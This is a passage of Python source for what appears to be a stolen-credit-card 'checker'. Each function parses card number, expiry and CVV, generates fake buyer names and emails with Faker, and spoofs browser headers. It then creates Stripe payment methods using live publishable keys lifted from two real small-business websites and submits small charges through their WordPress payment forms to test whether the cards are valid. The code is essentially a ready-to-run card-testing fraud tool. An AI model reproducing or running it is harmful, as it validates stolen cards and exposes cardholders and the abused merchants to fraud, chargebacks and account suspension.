        mail = fake.email(domain=domain)
        
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': generate_user_agent(),
        }

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=31c44e2c-ff98-456a-b087-c1741b7ed17d89892e&sid=90b87584-0fb9-4524-853f-bef9adeabc3d7ea090&pasted_fields=number&payment_user_agent=stripe.js%2F23733a2a86%3B+stripe-js-v3%2F23733a2a86%3B+card-element&referrer=https%3A%2F%2Fkimsharris.com&time_on_page=20310&key=pk_live_51KigSfCPln27C4EmfOhhQpM0Ypdgk6MOvvj1PxqmzFg9haWYVDAo4fmwnxAtjD5Uy5xbRnfhXdMEvG1KumQfSfOs00KflBHGPx'

        # Try to get Stripe payment method ID
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            id = response.json()['id']
        except:
            pass

        # Prepare second request with Stripe token
        cookies = {
            '__stripe_mid': '31c44e2c-ff98-456a-b087-c1741b7ed17d89892e',
            '__stripe_sid': '90b87584-0fb9-4524-853f-bef9adeabc3d7ea090',
        }

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://kimsharris.com',
            'Referer': 'https://kimsharris.com/book/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': generate_user_agent(),
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        params = {
            't': '1728570296432',
        }

        data = {
            'data': f'__fluent_form_embded_post_id=1076&_fluentform_4_fluentformnonce=74ce2c4970&_wp_http_referer=%2Fbook%2F&names%5Bfirst_name%5D={firstname}&email={mail}&payment_input=5&payment_method=stripe&payment-coupon=&__ff_all_applied_coupons=&__stripe_payment_method_id={id}',
            'action': 'fluentform_submit',
            'form_id': '4',
        }

        # Submit payment
        r5 = requests.post('https://kimsharris.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
        
        return (r5.json())
        
# Initialize Faker
fake = Faker()
def Tele5(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        guid = str(uuid.uuid4())    
        muid = str(uuid.uuid1())    
        sid = str(uuid.uuid5(uuid.NAMESPACE_DNS, 'example.com'))    
        time_on_page = random.randint(1, 30000) 
        

        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        data =  f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=8110f536-32ca-44aa-a871-199f65158a88b52d1d&sid=26492f43-fe84-47a2-958a-242528aae1474c1783&payment_user_agent=stripe.js%2F803162f903%3B+stripe-js-v3%2F803162f903%3B+card-element&referrer=https%3A%2F%2Fkarenfray.co.uk&time_on_page=56432&key=pk_live_51MopAgEkRuqshKSPQ6oKB3PQfbhKJKKnLrSqxTqw8vUF3NlKzkBYYffHSK8Ok8NXGadG69bD7SK4rKC2orbCjgdv00i3K49Tr2'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
        	id = response.json()['id']
        except:
        	pass

        cookies = {
    '__stripe_mid': '8110f536-32ca-44aa-a871-199f65158a88b52d1d',
    '__stripe_sid': '26492f43-fe84-47a2-958a-242528aae1474c1783',
}

        headers = {
    'authority': 'karenfray.co.uk',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=8110f536-32ca-44aa-a871-199f65158a88b52d1d; __stripe_sid=26492f43-fe84-47a2-958a-242528aae1474c1783',
    'origin': 'https://karenfray.co.uk',
    'referer': 'https://karenfray.co.uk/platform-mediumship-night/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1729925801969',
}

        data = {
    'data': f'__fluent_form_embded_post_id=526&_fluentform_5_fluentformnonce=d12c26c0a7&_wp_http_referer=%2Fplatform-mediumship-night%2F&names%5Bfirst_name%5D=thu&names%5Blast_name%5D=ra&email=thur34355%40gmail.com&address_1%5Baddress_line_1%5D=Street&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=NY&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&phone=%2B63676400&payment_input=12&item-quantity=1&payment_method=stripe&__entry_intermediate_hash=ec6d96d4b851fc247ec4d04496b3d8ac&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '5',
}

        r6 = requests.post(
    'https://karenfray.co.uk/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
        return (r6.json())